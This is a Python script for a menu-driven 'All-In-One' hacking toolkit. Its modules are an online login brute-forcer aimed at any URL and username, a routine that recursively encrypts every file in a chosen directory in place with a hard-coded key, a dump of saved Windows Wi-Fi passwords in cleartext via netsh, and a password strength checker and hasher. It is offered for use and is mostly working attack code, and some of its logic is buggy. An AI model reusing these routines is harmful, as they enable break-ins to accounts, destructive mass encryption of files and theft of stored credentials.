# ----------Banner--------
import pathlib

from pyfiglet import Figlet
# from termcolor import colored, cprint

# http://www.figlet.org/examples.html - fonts
# Text colors:
#
# grey
# red
# green
# yellow
# blue
# magenta
# cyan
# white

# Text highlights:
#
# on_grey
# on_red
# on_green
# on_yellow

# Attributes:
#
# bold
# dark
# underline
# blink
# reverse
# concealed
from os import system, name

# ----------Fernet imports----------
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet, InvalidToken
from Kika import KIKA
import hashlib
# -----------Brute Force imports-------
import requests
import random
# -----------Check+Hasher imports-------
import re
import bcrypt
from pathlib import Path
from os import path
# -----------Wifi SSIDs imports-------
import subprocess

# -----------IMPORTS-------

# TODO: -----------TODO-------
'''
- Add English only to the Password Checker Hasher
- Add File with Passwords to hash
-Error Check
-


'''
# TODO: -----------TODO-------
class Wipe(object):
    def __repr__(self):
        return '\n' * 10000
wipe = Wipe()

# custom_fig = Figlet(font='5lineoblique')
# print(custom_fig.renderText("Welcome To Elvo All In One Tool"))
print('Welcome to All-In-One Elvo Tool')

class AllinOne:
    def HackTools(Elvo):

        # custom_menu = Figlet(font='digital')
        print(('''
Welcome to the Main Menu!

 | For | Brute-Force >             [1]
 | For | Elvo Encryption >         [2]
 | For | Password Checker+Hasher > [3]
 | For | Wifi Intelligence >       [4]

 '''))
        User_Choice = input("And your choice would be?\n...: ")
        print(wipe)
        print("You chose...: ", User_Choice)

        # -----------------------Brute Force-----------------------
        if User_Choice == '1':
            def QUESTIONBRUTEFORCE():
                # custombruteforce = Figlet(font='bubble')
                #
                # print(custombruteforce.renderText('''"Welcome To Elvo\n
                #                                   Brute-Forcer'''))
                print('Welcome To The Brute-Forcer')

                BruteIntro = print('''How would you like to Brute Force?

1.With a Worldlist >         [1]
2.With Random Numbers >      [2]
3.With Your Own Characters > [3]
4.Main Menu >                [4]
''')
                BruteChoice = input(str("And your choice would be?\n...: "))
                print("You chose...: ", BruteChoice)

                if BruteChoice == "1":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')

                    # chars =  "123"

                    def send_request(username, passwd):
                        data = {
                            "username": username,
                            "password": passwd
                        }

                        r = requests.get(url, data=data)
                        return r

                    def implist():
                        print('ADD .txt TO THE FILE!')
                        worldlist = input('Wordlist Path...: ')
                        try:
                            file = open(worldlist, 'r')
                            tries = file.read().split('\n')
                            file.close()
                            return tries
                        except FileNotFoundError:
                            return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONBRUTEFORCE()

                    def main(tries):
                        for passwd in tries:
                            r = send_request(username, passwd)

                            if 'failed to login' in r.text.lower():
                                print(f"Incorrect {passwd}\n")
                            else:
                                print(f"Correct Password | {passwd} | !\n")
                                break

                    tries = implist()
                    main(tries)

                elif BruteChoice == "2":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONBRUTEFORCE()

                elif BruteChoice == "3":

                    url = input('Place the URL: ')
                    username = input('Place the username: ')
                    chars = input('Write the characters to use')
                    try:

                        def send_request(username, passwd):
                            data = {
                                "username": username,
                                "password": passwd
                            }

                            r = requests.get(url, data=data)
                            return r

                        def main():
                            while True:
                                rndpasswd = random.choices(chars, k=2)
                                # k= is the password length.
                                passwd = "".join(rndpasswd)
                                # This is how to convert a list to a string. - if we don't convert it to a string if it would print us a list.
                                r = send_request(username, passwd)

                                if 'failed to login' in r.text.lower():
                                    print(f"Incorrect {passwd}\n")
                                else:
                                    print(f"Correct Password | {passwd} | !\n")
                                    break

                        main()
                    except requests.exceptions.MissingSchema:
                        return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONBRUTEFORCE()

                elif BruteChoice == '4':
                    print('\n>>>Back To the Main Menu>>>\n')
                    return object.HackTools('Elvo.a')

                else:
                    print('''
                    \n-----ERROR-----
                    Something Isn't right
                    -----ERROR-----\n''')
                    return QUESTIONBRUTEFORCE()

            QUESTIONBRUTEFORCE()
        # -----------------------Brute Force-----------------------

        # -----------------------Fernet-----------------------
        elif User_Choice == '2':
            # custombruteforce = Figlet(font='bubble')
            # print(custombruteforce.renderText("Welcome To Elvo\n "
            #                                   "Encryptor"))
            #https://stackoverflow.com/questions/61141744/decrypting-multiple-files-using-cryptography-fernet
            print('Welcome To The Encryptor')

            # ---------Generate Key-------------

            try:
                file = open('fernetkey.key', 'rb')
                key = file.read()
                file.close()
            except FileNotFoundError:
                key = Fernet.generate_key()
                file = open('fernetkey.key', 'wb')
                file.write(key)
                file.close()

            password_provided = "password"  # This is input in the form of a string
            password = password_provided.encode()  # Convert to type bytes
            salt = b'\xa6\xfd\x1e\x84\xb0\xe2\x1a\x1cQ\xbd\xfb\xcc\xa6*\xf25\x86\xe2[\xed\xc2\xf3=[,\x13K\x1d\xdc\xad\x9e33\x9a5\x06\t\xdf%\x15\xaa\x86\xcf:\nN\xf8\xc1\x10\xf4N\xc26;:\xea\xf4\x02\x0fa7\xdf\xe3*\xf2\x8e:|\xd2\xbb_\xec4\x1b=\x83.j3\x9e\xf0\xba\x0e\xfb\xa2}h\xca\xa0\xc6\xeeK\x10v\x9fj+.pa\x1b\xe1\x08\xdf7\xb8\xb9\x8cb\x83(\x121\x7f]:\x0f\xb0\x834Gtq\x9a\x15\xdf\x1b\x91-\x04\xa2\xb7\xb9\xf80\x01\x1e\xeas1qj\n\xe2\xe0q45\xd1\x91g\xbb\x83G\x1dQf=\xd5\xd2\xd2z\x98\xaf\x164\xfeCZ\xda\x8cLR\x93c\x08\x07\x9f\xcb\x1fQD\x15\xf9\x83\x01\xc9\xb9Q\xe4\xf3\x82Cmq?\x8b\x92C\na\x8e\x92NB85\xb2\xf8\xbfFZk\x06\xda~g\xdcI\xbe\xdfN\xaa\x902Q\xa2\x1eV\x0f\xa1\xd8\xa7J\xbe=\xba\xc5y\xb8\nY\x1e\xdc\x83\xe5\xd0s\xca j\x8a\xbd\x10\x11\x18'  # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=300000,
                backend=default_backend()
            )
            key = base64.urlsafe_b64encode(kdf.derive(password))

            def QUESTIONFERNET():

                FERNETQUESTION = input('''What would you like to do?

To Encrypt   [1]
To Decrypt   [2]
To Main Menu [3]
...:''')

                if FERNETQUESTION == '1':
                    # TODO: --------------Encryption--------------
                    def getListOfFiles(dirName):
                        # create a list of file and sub directories
                        # names in the given directory
                        listOfFile = os.listdir(dirName)
                        allFiles = list()
                        # Iterate over all the entries
                        for entry in listOfFile:
                            # Create full path
                            fullPath = os.path.join(dirName, entry)
                            # If entry is a directory then get the list of files in this directory
                            if os.path.isdir(fullPath):
                                allFiles = allFiles + getListOfFiles(fullPath)
                            else:
                                allFiles.append(fullPath)

                        return allFiles
                    def main():
                        dirName = input('Path...: ')
                        if path.exists(dirName):
                            pass
                        else:
                            print('''
\n-----ERROR-----
Something Isn't right, Path does not exists.
-----ERROR-----\n''')


                        looptimes = input('How many times to run...: ')
                        try:
                            number = int(looptimes)
                            pass
                        except ValueError:
                            print('''
\n-----ERROR-----
Something Isn't right, numbers only.
-----ERROR-----\n''')
                            return QUESTIONFERNET()
                        looptimes = number
                        if number <= 0:
                         number += 1

                        counter = 0

                        # Get the list of all files in directory tree at given path
                        for number in range(looptimes):
                            listOfFiles = list()
                            for (dirpath, dirnames, filenames) in os.walk(dirName):
                                listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                            # Print the files
                            for elem in listOfFiles:
                                with open(elem, 'rb') as f:
                                    data = f.read()  # Read the bytes of the input file
                                    counter +=1

                                fernet = Fernet(key)
                                encrypted = fernet.encrypt(data)

                                with open(elem, 'wb') as f:
                                    f.write(encrypted)  # Write the encrypted bytes to the output file
                        print(wipe)
                        print(f'''\n
Encryption Info:
Looptimes:{looptimes}
File Passed:{counter}
The Path:{dirName}
key:{key} ''')

                        print('\n>>>Back To the Main Menu>>>\n')
                        object.HackTools('Elvo.a')

                    main()

                elif FERNETQUESTION == '2':

                    # TODO: ------------------DECRYPTION--------------------

                    Question = input("Are you sure? Yes/No...: ").capitalize()
                    if Question == 'Yes':
                        def getListOfFiles(dirName):
                            # create a list of file and sub directories
                            # names in the given directory
                            listOfFile = os.listdir(dirName)
                            allFiles = list()
                            # Iterate over all the entries
                            for entry in listOfFile:
                                # Create full path
                                fullPath = os.path.join(dirName, entry)
                                # If entry is a directory then get the list of files in this directory
                                if os.path.isdir(fullPath):
                                    allFiles = allFiles + getListOfFiles(fullPath)
                                else:
                                    allFiles.append(fullPath)

                            return allFiles

                        def main():
                            dirName = input('Path...: ')
                            filepath = pathlib.Path(dirName)
                            if filepath.exists():
                                pass
                            else:
                                print('''
\n-----ERROR-----
Something Isn't right, Path does not exists.
-----ERROR-----\n''')
                                return QUESTIONFERNET()

                            looptimes = input('How many times to run...: ')
                            try:
                                number = int(looptimes)
                                pass
                            except ValueError:
                                print('''
\n-----ERROR-----
Something Isn't right, numbers only.
-----ERROR-----\n''')
                                return QUESTIONFERNET()
                            looptimes = number
                            if number <= 0:
                                number = 1

                            counter = 0

                            # Get the list of all files in directory tree at given path
                            for number in range(looptimes):
                                listOfFiles = list()
                                for (dirpath, dirnames, filenames) in os.walk(dirName):
                                    listOfFiles += [os.path.join(dirpath, file) for file in filenames]
                                # Print the files
                                for elem in listOfFiles:

                                    with open(elem, 'rb') as f:
                                        data = f.read()  # Read the bytes of the input file
                                        counter += 1

                                    fernet = Fernet(key)
                                    try:
                                        decrypted = fernet.decrypt(data)

                                        with open(elem, 'wb') as f:
                                            f.write(decrypted)

                                    except InvalidToken as e:
                                        pass
                            print(wipe)
                            print("\nNo more files to decrypt\n")
                            print(f'''
Decryption Info:
Looptimes:{looptimes}
File Passes:{counter}
The Path:{dirName}
key:{key} ''')
                            object.HackTools('Elvo.a')
                        main()

                    else:
                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                        return QUESTIONFERNET()

                elif FERNETQUESTION == '3':
                    print('\n>>>Back To the Main Menu>>>\n')
                    return object.HackTools('Elvo.a')


                else:
                    return print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n'''), QUESTIONFERNET()

            QUESTIONFERNET()
            # -----------------------Fernet-----------------------

            # -----------------------Password Checker+Hasher-----------------------
        elif User_Choice == '3':
            # customcheckerhasher = Figlet(font='bubble')
            #
            # print(customcheckerhasher.renderText('''Welcome To Elvo\nPassword Checker \nand Hasher'''))
            print('Welcome To Elvo Password Checker and Hasher')

            def PASSCHECKER():
                print(''' 
Here you can check if your password is strong enough
and if it is strong enough,
you can also hash it.
''')

                PASSWORDQ = input('''Test and Hash OR Main Menu? 
Test and Hash >  [1]
Hash A File >    [2]
Verify Passwords [3]
Main Menu >      [4]
...:''')
                if PASSWORDQ == '1':
                    print(wipe)
                    print('''
Password MUST have:
1. Cant have spaces!.
2. Has to be in ENGLISH!.
3. Minimum 6 characters long.
4. Has to have at least one number.
5. Has to have at least lower case letter.
6. Has to have at least one special character.
7. Has to have at least one upper case character.
            ''')
                    PASSWORD = input('Check Your Password...:')

                    x = True
                    while x:
                        if (len(PASSWORD) < 6 or len(PASSWORD) > 100):
                            print(wipe)
                            print("\nPassword length between 6 and 100 please")
                            break

                        elif not re.search("[a-z]", PASSWORD):
                            print(wipe)
                            print("\nYou need at least one lower case letter")
                            break

                        elif not re.search("[0123456789]", PASSWORD):
                            print(wipe)
                            print("\nYou need at least one number")
                            break

                        elif not re.search("[A-Z]", PASSWORD):
                            print(wipe)
                            print("\nYou need at least one upper case character")
                            break

                        elif not re.search("[!@#$%]", PASSWORD):
                            print(wipe)
                            print("\nYou need at least one special character please")
                            break

                        elif re.search("\s", PASSWORD):
                            print(wipe)
                            print("\nYou cannot have blank spaces in your password...")
                            break



                        else:
                            print("Your Password is strong enough")
                            x = False


                            # -------------Password Hasher-------------
                            def PASSHASHER():
                                print('Hash your Password OR Main Menu')
                                PASSHASH = input('''
Hash My Password >    [1]
Main Menu  >          [2]
...: ''')
                                y = True
                                while y:
                                    if PASSHASH == '1':
                                        print(wipe)
                                        y = False
                                        PWDHASH = PASSHASH
                                        bytePWDHASH = PWDHASH.encode('utf-8')

                                        SALT = bcrypt.gensalt()
                                        hash = bcrypt.hashpw(bytePWDHASH, SALT).decode('utf-8')

                                        with open('Passwordhash.txt', 'w') as f:
                                            f.write('The Password you hashed: ')
                                            f.write(PASSWORD)
                                            f.write('\nYour Password Hash: ')
                                            f.write(hash)

                                        print(wipe)
                                        print('Password Info - ')
                                        print('Your Password: ', PASSWORD)
                                        print('Your Hashed Password:', hash)
                                        print('Your Passwords are save in:', os.getcwd() + '\Passwordhash.txt')

                                        print('>>>Back To the Main Menu>>>')
                                        return object.HackTools('Elvo.a')
                                    elif PASSHASH == '2':
                                        break
                                    else:
                                        print(wipe)
                                        print('''
\n-----ERROR-----
Something Isn't right 
-----ERROR-----\n''')
                                    return PASSHASHER()

                                if y:
                                    print(wipe)
                                    print('\n>>>Back To the Main Menu>>>\n')
                                    return object.HackTools('Elvo.a')


                            # -------------Password Hasher-------------
                            PASSHASHER()
                            break
                    if x:
                        print('''
\n-----ERROR-----
Something Isn't right, Check above.
-----ERROR-----\n''')
                        PASSCHECKER()





                elif PASSWORDQ == '2':
                    print('''
Welcome to the file hash section.
DON'T FORGET TO GIVE IT A FULL PATH AND ADD .TXT TO THE FILE!
This would OVERWRITE your file and hash each line inside this file.
Don't forget to save the salt for it.
                    ''')
                    FILEPATH = input('File To Hash...: ')
                    try:
                        FILEPATH.exists()
                        pass
                        path = open(FILEPATH, 'r')
                        lines = path.readlines()

                        path = open(FILEPATH, 'w')
                        for line in lines:
                            FILETXT = line.encode('utf-8')
                            SALT = bcrypt.gensalt()
                            hash = bcrypt.hashpw(FILETXT, SALT).decode('utf-8')
                            INSIDEFILE = f'{hash} : {line}'
                            path.write('\n--------------------------------------------------------\n')
                            path.writelines(INSIDEFILE)
                            path.write('\n--------------------------------------------------------\n')
                            print(INSIDEFILE)
                        print(f'''\n
                        All Done. 
                        You can find your file in...:', {FILEPATH},
                        'Your salt is...:',{SALT}
                        Save your salt somewhere safe so you can verify your passwords.''')
                        object.HackTools('Elvo.a')
                    except AttributeError:
                        print(wipe)
                        print('''
\n-----ERROR-----
Something Isn't right, Path does not exists.
-----ERROR-----\n''')
                        return PASSCHECKER()




                elif PASSWORDQ == '3':

                    def PASSVERI():
                        print(wipe)
                        PASSVERIQ = input('''
Here you can Verify the Hashed passwords.
Verify Passwords OR Main Menu:
Verify Passwords [1]
Main Menu        [2]
...: ''')
                        if PASSVERIQ == '1':
                            print(wipe)
                            PASSVERQSEC = input('''
Verify File OR Verify Password OR Main Menu:
Verify File     [1]
Verify Password [2]
Main Menu       [3]
                                                ''')
                            if PASSVERQSEC == '1':
                                print('Verfiy File, PLACE KEY')

                            elif PASSVERQSEC == '2':
                                print('Verify Password, PLACE KEY')

                            elif PASSVERQSEC == '3':
                                print('Main Menu')
                            else:
                                print('''
\n-----ERROR-----
Something Isn't right.
-----ERROR-----\n''')
                                return PASSVERIQ
                        elif PASSVERIQ == '2':
                            print(wipe)
                            print(
'\n>>>Back To the Main Menu>>>\n')
                            return object.HackTools('Elvo.a')

                    PASSVERI()

                elif PASSWORDQ == '4':
                    print(wipe)
                    print(
'\n>>>Back To the Main Menu>>>\n')
                    object.HackTools('Elvo.a')

                else:
                    print(wipe)
                    print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                    PASSCHECKER()

            PASSCHECKER()

            # -----------------------Password Checker+Hasher-----------------------

            # -----------------------Wifi SSIDs-----------------------
        elif User_Choice == '4':

            # customwifissid = Figlet(font='bubble')
            # print(customwifissid.renderText("Welcome To Elvo\n "
            #                                   "Wifi Info"))
            print(wipe)
            print('Welcome To Wifi Intelligence')
            def WIFISSID():
                WIFINETAVA = input('''
Known Networks OR Available Networks OR Main Menu?
Known Networks >     [1]
Available Networks > [2]
Main Menu >          [3]                
...:''')
                if WIFINETAVA == '1':
                    print(wipe)

                    print('All Known Networks OR Connect OR Main Menu')
                    WIFIQU = input('''
All Known Networks >         [1]
Connect To A Known network > [2]
Main Menu >                  [4] 
...:''')
                    if WIFIQU == '1':
                        print(wipe)

                        CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                        # .stdout.decode - shows all the wifi names in a table

                        WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                        # finds all the "All user Profile" text in the CMD

                        WIFILISTNAMES = []
                        # creating an empty list for all the wifi usernames and password to be saved in

                        if len(WIFINAMES) != 0:
                            for name in WIFINAMES:
                                WIFIPROFILE = {}
                                # dictionary for each wifi profile

                                PROFILEINFO = subprocess.run(["netsh", "wlan", "show", "profile", name],
                                                             capture_output=True).stdout.decode()

                                if re.search("Security key           : Absent", PROFILEINFO):
                                    continue
                                else:
                                    WIFIPROFILE["ssid"] = name
                                    PROFILEINFOPASS = subprocess.run(
                                        ["netsh", "wlan", "show", "profile", name, "key=clear"],
                                        capture_output=True).stdout.decode()
                                    PASSWORD = re.search("Key Content            : (.*)\r", PROFILEINFOPASS)
                                    if PASSWORD == None:
                                        WIFIPROFILE["password"] = None

                                    else:
                                        WIFIPROFILE["password"] = PASSWORD[1]

                                    WIFILISTNAMES.append(WIFIPROFILE)

                                    def WIFICONNECTION():
                                        print('\nConnect to WiFi OR Main Menu')
                                        WIFICON = input('''
Connect To The WiFi >    [1]
Main Menu >              [2]

...:''')
                                        if WIFICON == '1':
                                            print(wipe)
                                            print('\n-----KNOWN NETWORKS-----')
                                            for i in enumerate(WIFINAMES[:]):
                                                print(*i)
                                                for n in range(0):
                                                    print(n)
                                            print('\n-----KNOWN NETWORKS-----')
                                            # -----------------------Wifi Known Network connector-----------------------
                                            print('Choose your Network.')

                                            def WIFINET():
                                                valid = False
                                                while not valid:  # loop until the user enters a valid int
                                                    try:
                                                        WIFINETWORK = int(input('...: '))
                                                        valid = True  # if this point is reached, x is a valid int

                                                        WIFINETCON = subprocess.run(["netsh", "wlan", "connect",
                                                                                     f"ssid={WIFINAMES[WIFINETWORK]}",
                                                                                     f"name={WIFINAMES[WIFINETWORK]}"])



                                                        WIFINETCON
                                                        object.HackTools('Elvo.a')
                                                    except ValueError:
                                                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                                        WIFINET()

                                            WIFINET()


                                        elif WIFICON == '2':
                                            print(wipe)
                                            print('\nAs you wish')
                                            object.HackTools('Elvo.a')
                                        else:
                                            print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                                            WIFICONNECTION()
                                        # -----------------------Wifi Known Network connector-----------------------

                        for x in range(len(WIFILISTNAMES)):
                            print('\n--------------------Wifi Network-----------------------')
                            print(WIFILISTNAMES[x])
                            print(f'---------------------------------------------------------')
                        WIFICONNECTION()

                    # -----------------------Wifi Available Network-----------------------
                    elif WIFIQU == '2':
                        print(wipe)
                        CMD = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
                        # .stdout.decode - shows all the wifi names in a table

                        WIFINAMES = (re.findall("All User Profile     : (.*)\r", CMD))
                        # finds all the "All user Profile" text in the CMD
                        print('\n-----KNOWN NETWORKS-----')
                        for i in enumerate(WIFINAMES[:]):
                            print(*i)
                            for n in range(0):
                                print(n)
                        print('\n-----KNOWN NETWORKS-----')
                        # -----------------------Wifi Known Network connector-----------------------
                        print('Choose your Network.')

                        def WIFINET():
                            valid = False
                            while not valid:  # loop until the user enters a valid int
                                try:
                                    WIFINETWORK = int(input('...: '))
                                    print('\n')
                                    valid = True  # if this point is reached, x is a valid int
                                    try:
                                        WIFINETCON = subprocess.run(
                                            ["netsh", "wlan", "connect", f"ssid={WIFINAMES[WIFINETWORK]}",
                                             f"name={WIFINAMES[WIFINETWORK]}"])
                                        print('\n\n')
                                        WIFINETCON
                                    except IndexError:
                                        print(wipe)
                                        print('\n-----KNOWN NETWORKS-----')
                                        for i in enumerate(WIFINAMES[:]):
                                            print(*i)
                                            for n in range(0):
                                                print(n)
                                        print('\n-----KNOWN NETWORKS-----')

                                        print('''
\n-----ERROR-----
Something Isn't right, That's not an option.
-----ERROR-----\n''')
                                        WIFINET()

                                    object.HackTools('Elvo.a')
                                except ValueError:
                                    print(wipe)
                                    print('''
\n-----ERROR-----
Something Isn't right, Numbers only.
-----ERROR-----\n''')
                                    print('\n-----KNOWN NETWORKS-----')
                                    for i in enumerate(WIFINAMES[:]):
                                        print(*i)
                                        for n in range(0):
                                            print(n)
                                    print('\n-----KNOWN NETWORKS-----')


                                    WIFINET()

                        WIFINET()


                    elif WIFIQU == '3':
                        print(wipe)
                        print('\n>>>Back To the Main Menu>>>\n')
                        return object.HackTools('Elvo.a')

                    else:
                        print(wipe)
                        print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                        return WIFISSID()

                elif WIFINETAVA == '2':
                    print(wipe)
                    AVACMD = subprocess.run(["netsh", "wlan", "show", "networks"], capture_output=True).stdout.decode()
                    print(AVACMD)
                    print('\n>>>Back To the Main Menu>>>\n')
                    object.HackTools('Elvo.a')


                elif WIFINETAVA == '3':
                    print(wipe)
                    print('\n>>>Back To the Main Menu>>>\n')
                    object.HackTools('Elvo.a')

                else:
                    print(wipe)
                    print('''
\n-----ERROR-----
Something Isn't right
-----ERROR-----\n''')
                    WIFISSID()

                    # -----------------------Wifi Available Network-----------------------

            WIFISSID()
            # -----------------------Wifi SSIDs-----------------------
        else:
            KIKA()
            print('''
-----ERROR-----
Something Isn't right
-----ERROR-----'''),'\n>>>Back To the Main Menu>>>\n', object.HackTools('Elvo.a')


object = AllinOne
object.HackTools('Elvo.a')